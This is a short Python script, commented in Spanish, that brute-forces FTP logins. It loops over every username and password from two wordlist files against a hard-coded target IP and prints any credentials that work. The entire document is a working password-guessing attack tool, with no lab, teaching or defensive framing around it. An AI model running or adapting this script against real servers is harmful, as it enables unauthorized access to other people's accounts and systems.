import ftplib

def brute(ip,usuario,password):
	ftp = ftplib.FTP(ip)
	try:
		ftp.login(usuario,password)
		ftp.quit()
		print('Usuario: {}:{}'.format(usuario,password))
	except:
		print('No hubo conexion')

def main():
	ip = "192.168.0.2" # ip del ftp del objetivo
	usuarios = open('usuarios.txt','r')
	usuarios = usuarios.read().split('\n')
	passwords = open('contrasenas.txt','r')
	passwords = passwords.read().split('\n')

	for usuario in usuarios:
		for p in passwords:
			brute(ip,usuario,p)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		exit()

